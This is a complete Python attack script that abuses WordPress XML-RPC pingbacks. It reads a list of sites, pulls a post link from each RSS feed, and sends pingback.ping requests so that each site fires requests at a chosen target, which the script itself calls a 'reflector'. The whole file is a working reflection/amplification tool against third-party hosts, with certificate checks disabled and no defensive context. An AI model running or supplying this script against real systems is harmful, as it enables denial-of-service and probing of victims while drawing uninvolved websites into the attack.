import sys
import re
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.urllib3.disable_warnings(InsecureRequestWarning)

target = sys.argv[1]
path = sys.argv[2]

def get_blogs(web):
    endpoint = web + '/?feed=rss2'
    response = requests.get(endpoint, verify=False)
    matches = re.findall(r'<item>.+?<link>(.+?)<\/link>.+?<\/item>', response.text, re.DOTALL)
    return matches[0] if matches else None

def pingback(target, web, blog):
    payload = f"""
    <?xml version="1.0" encoding="utf-8"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param>
          <value><string>{target}</string></value>
        </param>
        <param>
          <value><string>{blog}</string></value>
        </param>
      </params>
    </methodCall>
    """
    xmlrpc = web + '/xmlrpc.php'
    response = requests.post(xmlrpc, data=payload, verify=False,timeout=10)
    if response.ok:
        text = response.text
        valor = int(re.findall('<int>(\d+)</int>', text)[0])
        print(valor)
        print(f"-> sent request to {target} using reflector {xmlrpc}")

with open(path, mode='r') as f:
    for line in f:
        linea = line.strip()
        blog = get_blogs(linea)
        pingback(target, linea, blog)
